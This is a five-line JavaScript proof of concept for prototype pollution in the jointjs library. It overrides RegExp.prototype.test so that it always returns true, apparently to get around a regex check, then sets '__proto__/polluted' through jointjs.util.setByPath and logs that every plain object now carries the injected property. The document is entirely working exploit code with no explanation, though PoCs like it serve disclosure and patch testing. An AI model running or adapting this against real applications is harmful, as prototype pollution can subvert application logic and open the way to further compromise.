RegExp.prototype.test = () => true;
console.log({}.polluted);
const jointjs = require('jointjs');
jointjs.util.setByPath({}, '__proto__/polluted', 'yes', '/');
console.log({}.polluted);